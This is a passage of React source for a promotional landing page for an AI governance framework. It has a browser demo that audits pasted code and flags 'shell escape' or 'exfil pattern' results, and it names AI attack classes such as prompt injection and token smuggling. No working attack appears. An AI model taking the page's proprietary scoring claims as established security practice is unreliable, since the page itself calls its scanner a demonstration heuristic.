      if (!f.isCode)               out.push(["·","no import surface (data artifact)","mute"]);
      else if (f.suspiciousImport) out.push(["⚠","suspicious import surface","halt"]);
      else if (f.importCount > 0)  out.push(["✓",`${f.importCount} import(s) clean`,"ok"]);
      else                         out.push(["·","no imports declared","mute"]);
    }
    if (gateIdx === 4) {
      if (!f.isCode)        out.push(["·","no execution surface","mute"]);
      else if (f.shellExec) out.push(["⚠","shell escape detected","halt"]);
      else if (f.infiniteLoop) out.push(["⚠","unbounded loop","halt"]);
      else if (f.exfilPattern) out.push(["⚠","exfil pattern detected","halt"]);
      else                  out.push(["✓","no dangerous primitives","ok"]);
    }
    if (gateIdx === 5) {
      if (!f.isCode)            out.push(["·","tests N/A for data artifact","mute"]);
      else if (f.hasTests)      out.push(["✓","assertions present","ok"]);
      else if (f.hasInvariants) out.push(["·","invariants only","mute"]);
      else                      out.push(["⚠","no tests or invariants","warn"]);
    }
    if (gateIdx === 6) {
      if (verdict === "DELIVER")     out.push(["✓","∞✓ stamp issued · plateau-lock","ok"]);
      if (verdict === "CONDITIONAL") out.push(["·","conditional · all gates passed, γ < 0.995","mute"]);
      if (verdict === "HALT")        out.push(["⚠","delivery refused","halt"]);
    }
    return out;
  };

  return (
    <section id="console" className="relative py-32 px-6 border-t border-white/5">
      <div className="max-w-7xl mx-auto">

        <div className="flex items-end justify-between flex-wrap gap-4 mb-12">
          <div>
            <div className="font-mono t-10 tk-32 uppercase t-gold-80 mb-3">03 / Live ACA Console</div>
            <h2 className="font-display t-h2 lh-100 font-light">
              Paste any artifact. Watch <span className="italic t-goldb">ACA decide.</span>
            </h2>
          </div>
          <p className="max-w-md text-white/55 t-15">
            Real client-side analysis. Kind-dispatched parsers — JS, Python, JSON, text — each gate validated against the right grammar. <span className="t-goldb">ERROR ≠ HALT.</span>
          </p>
        </div>

        <div className="grid lg:grid-cols-12 gap-px bg-white/5 border border-white/5">

          {/* LEFT — code input + verdict */}
          <div className="lg:col-span-5 bg-ink p-8">
            <div className="flex items-baseline justify-between mb-3 gap-3 flex-wrap">
              <label className="block font-mono t-10 tk-28 uppercase text-white/45">
                Artifact under audit
              </label>
              <div className="flex items-center gap-2">
                <span className="font-mono t-9 tk-24 uppercase text-white/35">
                  {autoKind ? "auto" : "manual"}
                </span>
                <span className="font-mono t-9 text-white/25">·</span>
                {[["js","JS"],["python","Py"],["json","JSON"],["text","Txt"]].map(([k,label]) => (
                  <button
                    key={k}
                    onClick={() => setKindManual(k)}
                    className={`font-mono t-9 tk-18 uppercase px-2 py-0.5 border transition-colors ${
                      kind === k
                        ? "bd-gold-60 t-goldb bg-gold-5"
                        : "border-white/10 text-white/45 hover:t-goldb hover:bd-gold-40"
                    }`}
                  >
                    {label}
                  </button>
                ))}
                {!autoKind && (
                  <button
                    onClick={() => { setAutoKind(true); setKind(detectKind(code)); }}
                    className="font-mono t-9 tk-18 uppercase px-2 py-0.5 text-white/35 hover:t-goldb"
                    title="resume auto-detect"
                  >
                    ↺
                  </button>
                )}
              </div>
            </div>
            <textarea
              value={code}
              onChange={(e) => onCodeChange(e.target.value)}
              rows={14}
              spellCheck={false}
              className="w-full bg-ink2 border border-white/10 focus:bd-gold-60 outline-none p-4 font-mono t-12 leading-relaxed text-white/85 resize-none transition-colors"
              placeholder="// paste a function, module, or snippet…"
            />

            <div className="mt-3 flex flex-wrap gap-2">
              {Object.entries(SAMPLES).map(([k, s]) => (
                <button
                  key={k}
                  onClick={() => loadSample(k)}
                  className={`font-mono t-10 tk-18 uppercase px-2.5 py-1 border transition-colors ${
                    activeSample === k
                      ? "bd-gold-60 t-goldb bg-gold-5"
                      : "border-white/10 text-white/55 hover:t-goldb hover:bd-gold-40"
                  }`}
                >
                  {s.label}
                </button>
              ))}
            </div>

            <div className="mt-6 flex items-center gap-3">
              <button
                onClick={run}
                className="px-6 py-3 bg-gold t-ink font-mono t-11 tk-28 uppercase font-medium hover:bg-goldb transition-colors"
              >
                Run ACA Audit →
              </button>
              <span className="font-mono t-10 text-white/35">
                7 gates · γ ≥ 0.995
              </span>
            </div>

            {/* verdict panel */}
            <div className="mt-8 border-t border-white/5 pt-6">
              <div className="font-mono t-10 tk-28 uppercase text-white/45 mb-4">
                Verdict
              </div>

              {result?.error && (
                <div className="border bd-halt-50 bg-halt-10 p-4">
                  <div className="font-mono t-10 tk-28 uppercase t-haltb opacity-80 mb-1">
                    error · gate could not run
                  </div>
                  <div className="font-display text-2xl font-light t-haltb mb-2">ERROR</div>
                  <div className="font-mono t-11 text-white/65 leading-relaxed">{result.error}</div>
                  <div className="mt-2 font-mono t-9 text-white/40">
                    phase: {result.phase}  ·  ERROR ≠ HALT — pipeline did not score the artifact
                  </div>
                </div>
              )}

              {!result && (
                <div className="font-mono text-sm text-white/40">awaiting audit…</div>
              )}

              {scores && (
                <div className="space-y-4">
                  <div className="grid grid-cols-4 gap-3 font-mono text-xs">
                    <div className="border border-white/10 p-3 bg-ink2">
                      <div className="text-white/40 t-9 tk-24 uppercase mb-2">kind</div>
                      <div className="text-2xl t-goldb">{result.kind}</div>
                    </div>
                    <div className="border border-white/10 p-3 bg-ink2">
                      <div className="text-white/40 t-9 tk-24 uppercase mb-2">γ avg</div>
                      <div className={`text-2xl ${
                        plateau && allGatesPassed ? "t-verb"
                        : verdict === "CONDITIONAL" ? "t-goldb"
                        : "t-haltb"
                      }`}>{gamma.toFixed(4)}</div>
                    </div>
                    <div className="border border-white/10 p-3 bg-ink2">
                      <div className="text-white/40 t-9 tk-24 uppercase mb-2">CL∞ min</div>
                      <div className={`text-2xl ${
                        cl_inf >= PLATEAU ? "t-verb"
                        : verdict === "CONDITIONAL" ? "t-goldb"
                        : "t-haltb"
                      }`}>{cl_inf.toFixed(4)}</div>
                    </div>
                    <div className="border border-white/10 p-3 bg-ink2">
                      <div className="text-white/40 t-9 tk-24 uppercase mb-2">Gates</div>
                      <div className={`text-2xl ${allGatesPassed ? "t-verb" : "t-goldb"}`}>{revealed < 7 ? `${revealed}/7` : `${gatesPassed}/${applicableCount}${naCount ? ` (+${naCount} N/A)` : ""}`}</div>
                    </div>
                  </div>

                  <div className={`relative overflow-hidden border p-4 ${
                    verdict === "DELIVER"     ? "bd-ver-50 bg-ver-5"
                    : verdict === "CONDITIONAL" ? "bd-gold-40 bg-gold-5"
                    : verdict === "HALT"      ? "bd-halt-50 bg-halt-10"
                    : "bd-gold-40 bg-gold-5"
                  }`}>
                    {verdict === "RUNNING" && (
                      <div className="absolute inset-0 pointer-events-none">
                        <div className="absolute left-0 right-0 h-px bg-goldb-40 scan" />
                      </div>
                    )}
                    <div className="font-mono t-10 tk-28 uppercase mb-1 opacity-70">
                      {verdict === "DELIVER"     ? "delivery_validated · ∞✓ stamped"
                       : verdict === "CONDITIONAL" ? "all applicable gates passed · below plateau-lock"
                       : verdict === "HALT"      ? `halt at gate · ${failedGate ? failedGate.label : "composite"}`
                       : "executing gates…"}
                    </div>
                    <div className={`font-display text-3xl font-light ${
                      verdict === "DELIVER"       ? "t-verb"
                      : verdict === "CONDITIONAL" ? "t-goldb"
                      : verdict === "HALT"        ? "t-haltb"
                      : "t-goldb"
                    }`}>
                      {verdict === "DELIVER"       ? <>DELIVER · <InfinityCheck /></>
                       : verdict === "CONDITIONAL" ? <>DELIVER · CONDITIONAL</>
                       : verdict}
                    </div>
                    {verdict === "HALT" && failedGate && (
                      <div className="mt-2 font-mono t-11 text-white/55">
                        Gate 0{failedGate.i} — {failedGate.label} — failed plateau threshold. Artifact is not a governed artifact.
                      </div>
                    )}
                    {verdict === "CONDITIONAL" && limitingGate && (
                      <div className="mt-2 font-mono t-11 text-white/55">
                        γ = {gamma.toFixed(4)} · CL∞ = {cl_inf.toFixed(4)} · limiting gate: G{limitingGate.i} {limitingGate.label} (s={cl_inf.toFixed(2)}). Artifact is governed but not certified at plateau-lock tier.
                      </div>
                    )}
                  </div>
                </div>
              )}
            </div>
          </div>

          {/* RIGHT — gate-by-gate pipeline */}
          <div className="lg:col-span-7 bg-ink2 p-8">
            <div className="flex items-baseline justify-between mb-5">
              <div className="font-mono t-10 tk-28 uppercase text-white/45">
                ACA Pipeline · E121 → E143
              </div>
              <div className="font-mono t-10 text-white/40">
                kᵢ = (1 − sᵢ) × λᵢ
              </div>
            </div>

            <div className="space-y-1.5">
              {ACA_GATES.map((g, idx) => {
                const live = scores && idx < revealed;
                const sv = scores ? scores[g.key] : 0;
                const isNA = sv === NA_SENTINEL;
                const ok = !isNA && sv >= 0.5;
                const callouts = flagsFor(idx);
                return (
                  <div
                    key={g.key}
                    className={`border transition-all duration-300 ${
                      live ? "border-white/10 bg-ink" : "border-white/5 bg-transparent opacity-30"
                    }`}
                  >
                    <div className="grid grid-cols-12 items-center gap-3 px-3 py-2.5">
                      <div className="col-span-3 font-mono t-11 flex items-center gap-2">
                        <span className="text-white/40">G{g.i}</span>
                        <span className={`font-medium ${live ? (isNA ? "text-white/45" : ok ? "t-verb" : "t-haltb") : "text-white/40"}`}>
                          {g.label}
                        </span>
                      </div>
                      <div className="col-span-3 font-mono t-9 t-gold-70">{g.elem}</div>
                      <div className="col-span-4 relative h-1.5 bg-white/5 overflow-hidden">
                        {!isNA && (
                          <div
                            className={`absolute inset-y-0 left-0 transition-all duration-700 ${ok ? "bg-verb" : "bg-gold"}`}
                            style={{ width: live ? `${sv * 100}%` : "0%" }}
                          />
                        )}
                        {isNA && live && (
                          <div className="absolute inset-0 flex items-center justify-center">
                            <span className="font-mono t-9 text-white/30 tk-24">— not applicable —</span>
                          </div>
                        )}
                      </div>
                      <div className="col-span-2 text-right font-mono t-11">
                        {live ? (
                          isNA ? (
                            <span className="text-white/40">N/A</span>
                          ) : (
                            <span className="text-white/85">s={sv.toFixed(2)}</span>
                          )
                        ) : (
                          <span className="text-white/30">—</span>
                        )}
                      </div>
                    </div>
                    {live && callouts.length > 0 && (
                      <div className="px-3 pb-2.5 pt-0 flex flex-wrap gap-x-4 gap-y-1 font-mono t-9">
                        {callouts.map(([icon, msg, tone], k) => (
                          <span key={k} className={
                            tone === "ok"   ? "t-verb"
                            : tone === "halt" ? "t-haltb"
                            : tone === "warn" ? "t-goldb"
                            : "text-white/45"
                          }>
                            {icon} {msg}
                          </span>
                        ))}
                      </div>
                    )}
                  </div>
                );
              })}
            </div>

            {/* footer telemetry */}
            <div className="mt-6 pt-6 border-t border-white/5 grid grid-cols-3 gap-4 font-mono t-10 text-white/45">
              <div>
                <div className="tk-24 uppercase text-white/35 mb-1">decision</div>
                <div>E&lt;L → BLOCK</div>
                <div>E=L → CL∞ check</div>
                <div className="t-haltb">E&gt;L → INVALID</div>
              </div>
              <div>
                <div className="tk-24 uppercase text-white/35 mb-1">elements</div>
                <div>S19 Code · 21</div>
                <div>S20 Workflow · 17</div>
                <div className="t-goldb">E121–E143 · lifecycle</div>
              </div>
              <div>
                <div className="tk-24 uppercase text-white/35 mb-1">enforcement</div>
                <div>γ ≥ 0.995 = DELIVER</div>
                <div>γ &lt; 0.995 = HALT</div>
                <div>N ≤ 5 re-runs cap</div>
              </div>
            </div>
          </div>
        </div>

        <p className="mt-6 font-mono t-10 text-white/30 max-w-3xl">
          Demonstration heuristic. Production ACA performs full AST traversal, dependency-graph diff against signed manifests, sandboxed execution profiling, and signed delivery seals. <span className="t-goldb">Kind dispatch is honest — Python is structurally linted in-browser; full ast.parse runs server-side.</span> A gate that cannot run reports ERROR, never a fabricated HALT.
        </p>

      </div>
    </section>
  );
};
// ───────────────────────── Architecture ─────────────────────────
const Architecture = () => {
  const [hoverLayer, setHoverLayer] = useState(null);
  const [hoverSection, setHoverSection] = useState(null);
  const total = SECTIONS_20.reduce((a, [,, n]) => a + n, 0);

  return (
    <section id="architecture" className="relative py-32 px-6 border-t border-white/5">
      <div className="max-w-7xl mx-auto">

        <div className="flex items-end justify-between flex-wrap gap-4 mb-12">
          <div>
            <div className="font-mono t-10 tk-32 uppercase t-gold-80 mb-3">04 / Architecture</div>
            <h2 className="font-display t-h2 lh-100 font-light">
              InfinityGPT — <span className="italic t-goldb">9 layers, 20 sections, 143 elements.</span>
            </h2>
          </div>
          <div className="font-mono t-11 text-white/50">
            <span className="t-goldb">{total}</span> canonical elements · all paths must execute · <InfinityCheck />
          </div>
        </div>

        <div className="grid lg:grid-cols-12 gap-px bg-white/5 border border-white/5">

          {/* LAYER STACK — vertical, top-down: CL∞ → L₉ → L₁ → AI(x) */}
          <div className="lg:col-span-5 bg-ink p-8">
            <div className="font-mono t-10 tk-28 uppercase text-white/45 mb-5">
              Compositional Stack · CL∞ ∘ L₉ ∘ … ∘ L₁ ∘ AI(x)
            </div>

            {/* CL∞ cap */}
            <div className="border bd-ver-40 bg-ver-5 px-4 py-3 mb-2 flex items-center justify-between">
              <div>
                <div className="font-mono t-10 tk-24 uppercase t-verb">DELIVER</div>
                <div className="font-display text-lg text-white/85">CL∞  ·  Plateau-Lock</div>
              </div>
              <span className="font-mono text-xs t-verb">γ ≥ 0.995</span>
            </div>

            {/* 9 layers — top is L₉, bottom is L₁ */}
            {[...LAYERS].reverse().map(L => {
              const active = hoverLayer === L.i;
              return (
                <button
                  key={L.i}
                  onMouseEnter={() => setHoverLayer(L.i)}
                  onMouseLeave={() => setHoverLayer(null)}
                  className={`w-full text-left border px-4 py-3 mb-1 flex items-center justify-between transition-all duration-200 ${
                    active ? "bd-gold-60 bg-gold-5" : "border-white/5 bg-ink2 hover:border-white/15"
                  }`}
                  style={{ marginLeft: `${(9 - L.i) * 6}px`, marginRight: `${(9 - L.i) * 6}px` }}
                >
                  <div className="flex items-center gap-4">
                    <span className="font-mono t-10 text-white/40 w-6">L{L.i}</span>
                    <span className={`font-display text-lg ${active ? "t-goldb" : "text-white/85"}`}>{L.name}</span>
                    <span className="hidden sm:inline font-body italic t-12 text-white/45">{L.fn}</span>
                  </div>
                  <span className="font-mono t-10 text-white/35">λ={L.lambda.toFixed(2)}</span>
                </button>
              );
            })}

            {/* AI(x) input */}
            <div className="border border-white/10 bg-ink3 px-4 py-3 mt-2 flex items-center justify-between">
              <div>
                <div className="font-mono t-10 tk-24 uppercase text-white/40">INPUT</div>
                <div className="font-display text-lg text-white/70">AI(x)  ·  raw model output</div>
              </div>
              <span className="font-mono text-xs text-white/35">ungoverned</span>
            </div>

            <div className="mt-6 grid grid-cols-3 gap-3 font-mono t-10 text-white/50">
              <div className="border border-white/5 p-2.5">
                <div className="t-goldb mb-1">E &lt; L</div>
                <div className="text-white/40">BLOCK</div>
              </div>
              <div className="border border-white/5 p-2.5">
                <div className="t-verb mb-1">E = L</div>
                <div className="text-white/40">CL∞ check</div>
              </div>
              <div className="border border-white/5 p-2.5">
                <div className="t-haltb mb-1">E &gt; L</div>
                <div className="text-white/40">INVALID · drift</div>
              </div>
            </div>
          </div>

          {/* 20 SECTIONS / 143 ELEMENTS GRID */}
          <div className="lg:col-span-7 bg-ink2 p-8">
            <div className="flex items-baseline justify-between mb-5">
              <div className="font-mono t-10 tk-28 uppercase text-white/45">
                20 Sections · {total} Canonical Elements
              </div>
              <div className="font-mono t-10 text-white/40">
                {hoverSection ? `${hoverSection[0]}  ·  ${hoverSection[1]}  ·  ${hoverSection[2]} elements` : "hover to inspect"}
              </div>
            </div>

            {/* section grid — sized by element count */}
            <div className="grid grid-cols-4 sm:grid-cols-5 gap-1.5">
              {SECTIONS_20.map(([id, name, n]) => {
                const active = hoverSection?.[0] === id;
                const intensity = Math.min(1, 0.25 + n / 21);
                return (
                  <button
                    key={id}
                    onMouseEnter={() => setHoverSection([id, name, n])}
                    onMouseLeave={() => setHoverSection(null)}
                    className={`aspect-square border p-2 flex flex-col justify-between text-left transition-all ${
                      active ? "bd-gold-70 bg-gold-10" : "border-white/8 hover:border-white/25"
                    }`}
                    style={{ background: active ? undefined : `rgba(201,164,76,${intensity * 0.08})` }}
                  >
                    <div className="font-mono t-10 text-white/45">{id}</div>
                    <div>
                      <div className={`t-11 leading-tight ${active ? "t-goldb" : "text-white/75"}`}>{name}</div>
                      <div className="font-mono t-10 text-white/40 mt-0.5">{n}</div>
                    </div>
                  </button>
                );
              })}
            </div>

            {/* IASA highlight */}
            <div className="mt-8 border bd-gold-30 bg-gold-5 p-5">
              <div className="flex items-center justify-between mb-3">
                <div className="font-mono t-10 tk-28 uppercase t-goldb">
                  GAIF-IASA · Integrated AI Security Architecture
                </div>
                <span className="font-mono t-10 text-white/45">γ = 0.999 · <InfinityCheck /></span>
              </div>
              <div className="grid sm:grid-cols-5 gap-3 font-mono t-10">
                {[
                  ["E53", "Infinity Cyber Security Dragon™", "S10 enforcement"],
                  ["E89", "Privacy & Confidentiality", "S15 · CIA-C"],
                  ["E95", "GenAI Security Posture", "S15 · checklist"],
                  ["E100","CBRN Catastrophic Guardrail", "S15 · final"],
                  ["S15", "E89–E100 NIST block", "regulatory anchor"],
                ].map(([k, t, sub]) => (
                  <div key={k} className="border border-white/10 bg-ink p-3">
                    <div className="t-goldb mb-1">{k}</div>
                    <div className="text-white/80 leading-snug mb-1">{t}</div>
                    <div className="text-white/40">{sub}</div>
                  </div>
                ))}
              </div>
            </div>
          </div>
        </div>

      </div>
    </section>
  );
};
// ───────────────────────── Certification ─────────────────────────
const Certification = () => {
  // 250-working-day commercialization window: April 6, 2026 → April 5, 2027
  const windowStart = new Date("2026-04-06");
  const windowEnd   = new Date("2027-04-05");
  const today       = new Date();
  const totalMs     = windowEnd - windowStart;
  const elapsedMs   = Math.max(0, Math.min(totalMs, today - windowStart));
  const pctWindow   = (elapsedMs / totalMs) * 100;
  const daysIn      = Math.floor(elapsedMs / (1000 * 60 * 60 * 24));
  const daysLeft    = Math.max(0, Math.floor((windowEnd - today) / (1000 * 60 * 60 * 24)));

  const TIERS = [
    {
      name: "Community",
      price: 209,
      tagline: "HBCU · Black-led municipality · community institution",
      features: [
        "Full Governed AI Infinity Framework license",
        "9-layer audit infrastructure (WHO → IMPACT)",
        "143-element canonical reference",
        "GAIF-IASA security block (E89–E100)",
        "Plateau-Lock telemetry (γ ≥ 0.995)",
        "Quarterly framework upgrades",
        "Community pricing — Van Westendorp validated",
      ],
      cta: "Apply — Community",
      tone: "verified",
    },
    {
      name: "National",
      price: 349,
      tagline: "Federal · Enterprise · National-scale deployment",
      features: [
        "Everything in Community, plus:",
        "Federal positioning brief (OMB M-25-21/22, M-26-04, EO 14179)",
        "Token Threat Surface™ deployment kit",
        "ACA-GIOS execution lifecycle (E121–E143)",
        "Quantum-readiness module (S18, 8 elements)",
        "Direct line to AI Infinity R&D Institute",
        "Audit-replay deterministic integrity",
      ],
      cta: "Apply — National",
      tone: "gold",
      featured: true,
    },
  ];

  return (
    <section id="certification" className="relative py-32 px-6 border-t border-white/5">
      <div className="max-w-7xl mx-auto">

        <div className="flex items-end justify-between flex-wrap gap-4 mb-12">
          <div>
            <div className="font-mono t-10 tk-32 uppercase t-gold-80 mb-3">05 / Certification</div>
            <h2 className="font-display t-h2 lh-100 font-light">
              <span className="italic t-goldb">100 holders.</span> 250 working days.
              <br />The proof-point lock.
            </h2>
          </div>
          <p className="max-w-md text-white/55 t-15">
            Certification is the proof-point. Pricing was set via Van Westendorp methodology and tiered for federal scale and community access.
          </p>
        </div>

        {/* Window + milestone telemetry */}
        <div className="grid md:grid-cols-2 gap-px bg-white/5 border border-white/5 mb-10">
          <div className="bg-ink p-6">
            <div className="flex items-baseline justify-between mb-3">
              <div className="font-mono t-10 tk-28 uppercase text-white/45">Commercialization Window</div>
              <div className="font-mono t-10 t-goldb">{daysLeft} days left</div>
            </div>
            <div className="font-display text-2xl text-white/85 mb-1">Apr 6, 2026  →  Apr 5, 2027</div>
            <div className="font-mono t-11 text-white/45 mb-4">Day {daysIn} of 365 calendar · ~250 working</div>
            <div className="relative h-2 bg-white/5 overflow-hidden">
              <div className="absolute inset-y-0 left-0 bg-gold" style={{ width: `${pctWindow}%` }} />
              <div className="absolute right-0 inset-y-0 w-px bg-goldb" />
            </div>
            <div className="flex justify-between mt-2 font-mono t-10 text-white/35">
              <span>start</span><span>{pctWindow.toFixed(1)}%</span><span>lock</span>
            </div>
          </div>

          <div className="bg-ink p-6">
            <div className="flex items-baseline justify-between mb-3">
              <div className="font-mono t-10 tk-28 uppercase text-white/45">100-Holder Milestone</div>
              <div className="font-mono t-10 t-verb">primary proof-point</div>
            </div>
            <div className="font-display text-2xl text-white/85 mb-1">Target: 100 certified holders</div>
            <div className="font-mono t-11 text-white/45 mb-4">Initial cohort · HBCU + community + federal mix</div>
            <div className="grid grid-cols-10 gap-1">
              {Array.from({length: 100}).map((_, i) => (
                <div key={i} className="aspect-square border border-white/10" />
              ))}
            </div>
            <div className="flex justify-between mt-2 font-mono t-10 text-white/35">
              <span>cohort 01</span><span>10×10 grid</span><span>milestone</span>
            </div>
          </div>
        </div>

        {/* Pricing tiers */}
        <div className="grid md:grid-cols-2 gap-px bg-white/5 border border-white/5">
          {TIERS.map(t => (
            <div
              key={t.name}
              className={`p-8 ${t.featured ? "bg-ink2" : "bg-ink"} relative`}
            >
              {t.featured && (
                <div className="absolute top-0 right-0 px-3 py-1 bg-gold t-ink font-mono t-9 tk-28 uppercase">
                  Federal scale
                </div>
              )}

              <div className="flex items-baseline justify-between mb-2">
                <h3 className="font-display text-3xl text-white/95">{t.name}</h3>
                <Tag tone={t.tone}>tier</Tag>
              </div>
              <p className="text-white/50 t-13 mb-6">{t.tagline}</p>

              <div className="flex items-baseline gap-2 mb-1">
                <span className="font-mono text-sm text-white/40">$</span>
                <span className="font-display text-6xl font-light text-white/95">{t.price}</span>
                <span className="font-mono text-sm text-white/40">/ mo</span>
              </div>
              <div className="font-mono t-10 text-white/35 mb-8">Van Westendorp-validated pricing</div>

              <ul className="space-y-2.5 mb-8">
                {t.features.map((f, i) => (
                  <li key={i} className="flex gap-3 t-14 text-white/70">
                    <span className={`font-mono text-xs mt-1 ${t.featured ? "t-goldb" : "t-verb"}`}>
                      {i === 0 && t.featured ? "+" : "·"}
                    </span>
                    <span className={i === 0 && t.featured ? "italic text-white/90" : ""}>{f}</span>
                  </li>
                ))}
              </ul>

              <button className={`w-full py-4 font-mono t-11 tk-28 uppercase font-medium transition-colors ${
                t.featured
                  ? "bg-gold t-ink hover:bg-goldb"
                  : "bg-transparent border border-white/15 text-white/85 hover:bd-gold-60 hover:t-goldb"
              }`}>
                {t.cta} →
              </button>
            </div>
          ))}
        </div>

        <p className="mt-6 font-mono t-10 text-white/30 max-w-3xl">
          Go-to-market: HBCUs · Black-led municipalities · National Black Chamber of Commerce · Congressional Black Caucus. IP held under trade-secret protection (Coca-Cola model). Application required.
        </p>

      </div>
    </section>
  );
};
// ───────────────────────── Token Threat Surface™ ─────────────────────────
const ThreatSurface = () => {
  const stages = [
    { id: "input",   label: "Input",      sub: "raw prompt · file · context",     risk: "prompt injection · poisoning",       defense: "WHO · WHAT attach" },
    { id: "tokens",  label: "Tokens",     sub: "tokenization · embedding",         risk: "token-level smuggling",              defense: "Privacy Layer · E89" },
    { id: "infer",   label: "Inference",  sub: "model forward pass",               risk: "hallucination · drift",              defense: "WHY · HOW · γ check" },
    { id: "codegen", label: "Code Gen",   sub: "AI-authored artifact",             risk: "unsafe code · backdoor",             defense: "ACA · S19 (21 elements)" },
    { id: "execute", label: "Execution",  sub: "runtime · system call",            risk: "lateral movement · data exfil",      defense: "GIOS · S20 · HALT" },
  ];

  return (
    <section id="threat-surface" className="relative py-32 px-6 border-t border-white/5">
      <div className="max-w-7xl mx-auto">

        <div className="flex items-end justify-between flex-wrap gap-4 mb-12">
          <div>
            <div className="font-mono t-10 tk-32 uppercase t-gold-80 mb-3">06 / Token Threat Surface™</div>
            <h2 className="font-display t-h2 lh-100 font-light">
              Risk begins at the <span className="italic t-goldb">token</span>.
              <br />Defense begins there too.
            </h2>
          </div>
          <p className="max-w-md text-white/55 t-15">
            The Token Threat Surface™ is the complete attack surface from raw input through execution. Ungoverned token handling is where AI security fails first.
          </p>
        </div>

        {/* Flow diagram */}
        <div className="bg-ink border border-white/5 p-6 sm:p-10 mb-px">
          <div className="font-mono t-10 tk-28 uppercase text-white/45 mb-8">
            Surface Map  ·  ungoverned ↦ governed
          </div>

          <div className="grid grid-cols-1 lg:grid-cols-5 gap-3">
            {stages.map((s, i) => (
              <div key={s.id} className="relative">
                {/* connector arrow on desktop */}
                {i < stages.length - 1 && (
                  <div className="hidden lg:block absolute top-1/2 -right-2.5 w-5 h-px gold-arrow" />
                )}
                <div className="border border-white/10 bg-ink2 p-5 h-full hover:bd-gold-40 transition-colors group">
                  <div className="flex items-center justify-between mb-4">
                    <span className="font-mono t-10 text-white/35">0{i+1}</span>
                    <span className="w-2 h-2 rounded-full bg-gold-60 group-hover:bg-goldb pulse-dot" />
                  </div>
                  <div className="font-display text-xl text-white/90 mb-1">{s.label}</div>
                  <div className="font-mono t-10 text-white/40 mb-5">{s.sub}</div>

                  <div className="space-y-3">
                    <div>
                      <div className="font-mono t-9 tk-24 uppercase t-haltb-80 mb-1">Risk</div>
                      <div className="t-12 text-white/70 leading-snug">{s.risk}</div>
                    </div>
                    <div>
                      <div className="font-mono t-9 tk-24 uppercase t-verb mb-1">GAIF Defense</div>
                      <div className="t-12 text-white/70 leading-snug">{s.defense}</div>
                    </div>
                  </div>
                </div>
              </div>
            ))}
          </div>
        </div>

        {/* CIA triad mapping */}
        <div className="grid md:grid-cols-3 gap-px bg-white/5 border border-white/5">
          {[
            {
              letter: "C",
              name: "Confidentiality",
              map: "Privacy & Confidentiality Layer",
              elem: "E89  ·  S15 (NIST-aligned)",
              note: "Token-level confidentiality enforcement. First element of S15. Stops smuggling before the model sees it.",
            },
            {
              letter: "I",
              name: "Integrity",
              map: "ACA  ·  GIOS  ·  S17",
              elem: "21 code elements · execution lifecycle",
              note: "AI Code Assistant verifies integrity before code is treated as governed artifact. GIOS enforces deterministic replay.",
            },
            {
              letter: "A",
              name: "Availability",
              map: "HALT  ·  S20 Workflow",
              elem: "17 workflow elements · N ≤ 5 cap",
              note: "Plateau-Lock forces refusal over hallucination. Availability is preserved by refusing to deliver ungoverned output.",
            },
          ].map((c, i) => (
            <div key={c.letter} className="bg-ink p-8">
              <div className="flex items-baseline gap-4 mb-5">
                <span className="font-display text-7xl font-light t-gold-40 leading-none">{c.letter}</span>
                <div>
                  <div className="font-mono t-10 tk-28 uppercase text-white/45">CIA · 0{i+1}</div>
                  <div className="font-display text-2xl text-white/95">{c.name}</div>
                </div>
              </div>
              <div className="border-t border-white/5 pt-4">
                <div className="font-mono t-10 tk-24 uppercase t-goldb mb-1">Maps to</div>
                <div className="text-white/85 mb-1">{c.map}</div>
                <div className="font-mono t-11 text-white/45 mb-4">{c.elem}</div>
                <p className="t-13 text-white/60 leading-relaxed">{c.note}</p>
              </div>
            </div>
          ))}
        </div>

        {/* IASA badge row */}
        <div className="mt-10 border bd-gold-25 bg-iasa-grad p-6 sm:p-8">
          <div className="flex flex-wrap items-center justify-between gap-4 mb-3">
            <div className="font-display text-xl text-white/90">
              The <span className="italic t-goldb">Infinity Cyber Security Dragon™</span> sits mid-stack.
            </div>
            <Tag tone="gold">E53 · S10 enforcement canon</Tag>
          </div>
          <p className="t-14 text-white/55 max-w-3xl leading-relaxed">
            A concealed defensive organism inside the framework — not a perimeter, not a gateway. Discovered only by adversaries that already passed the outer layers, by which point they have already failed plateau-lock.
          </p>
        </div>

      </div>
    </section>
  );
};

// ───────────────────────── Footer ─────────────────────────
const Footer = () => (
  <footer className="relative px-6 pt-24 pb-16 border-t border-white/5">
    <div className="max-w-7xl mx-auto">

      <div className="grid lg:grid-cols-12 gap-10 mb-16">
        <div className="lg:col-span-6">
          <div className="font-mono t-10 tk-32 uppercase t-gold-80 mb-4">
            From the Labs of the AI Infinity Research &amp; Development Institute
          </div>
          <div className="font-display text-3xl text-white/90 leading-tight mb-4">
            Andre Thompson Sr.
          </div>
          <div className="font-body text-white/60 t-14 leading-relaxed max-w-md">
            Founder &amp; sole IP owner — AI Infinity Group LLC.
            Doctoral candidate, <em>Governed Intelligence: A Constitutional Architecture for the Age of Artificial Intelligence.</em>
            Vice Foreperson, Albany Criminal Grand Jury. Champion of the AI Consumer™.
          </div>
          <div className="mt-6 flex flex-wrap gap-2">
            <Tag tone="verified">∞✓ verified</Tag>
            <Tag tone="gold">SAG-compliant</Tag>
            <Tag tone="mute">Trade-secret IP</Tag>
            <Tag tone="mute">Albany, GA</Tag>
          </div>
        </div>

        <div className="lg:col-span-3">
          <div className="font-mono t-10 tk-28 uppercase text-white/40 mb-4">Surface</div>
          <ul className="space-y-2 font-body t-14 text-white/65">
            <li><a href="#manifesto" className="hover:t-goldb">Manifesto</a></li>
            <li><a href="#audit" className="hover:t-goldb">Live Audit</a></li>
            <li><a href="#architecture" className="hover:t-goldb">Architecture</a></li>
            <li><a href="#certification" className="hover:t-goldb">Certification</a></li>
            <li><a href="#threat-surface" className="hover:t-goldb">Token Threat Surface™</a></li>
          </ul>
        </div>

        <div className="lg:col-span-3">
          <div className="font-mono t-10 tk-28 uppercase text-white/40 mb-4">Contact</div>
          <ul className="space-y-2 font-body t-14 text-white/65">
            <li>andre@infinitydragon.ai</li>
            <li>infinitydragon.ai</li>
            <li className="pt-3 font-mono t-10 text-white/35">
              GAIF = Governed AI Infinity Framework
            </li>
            <li className="font-mono t-10 text-white/35">
              (disambiguated from Kenney's GAIF)
            </li>
          </ul>
        </div>
      </div>

      <div className="border-t border-white/5 pt-6 flex flex-wrap items-center justify-between gap-4">
        <div className="font-mono t-10 text-white/35 flex flex-wrap gap-3">
          <span>#GAIF</span>
          <span>#GovernedAI</span>
          <span>#TokenThreatSurface</span>
          <span>#ChampionOfTheAIConsumer</span>
          <span>#GovernedIntelligence</span>
